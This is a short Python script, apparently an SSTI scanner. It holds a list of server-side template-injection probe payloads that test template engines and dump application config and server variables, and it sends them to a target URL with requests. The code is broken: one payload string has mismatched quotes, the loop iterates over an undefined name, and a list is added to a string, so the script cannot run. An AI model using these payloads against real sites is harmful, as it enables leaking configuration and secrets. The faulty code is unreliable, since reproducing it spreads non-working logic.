import requests

payloads = ['{{2*2}}[[3*3]]','{{3*3}}','{{3*'3'}}','<%= 3 * 3 %>','${6*6}','${{3*3}}','@(6+5)','{{dump(app)}}','{{app.request.server.all|join(',')}}','{{config.items()}}']

def ssti(url):
    for payload in payload:
        url = url + payloads
    response = requests.get(url)
    return response



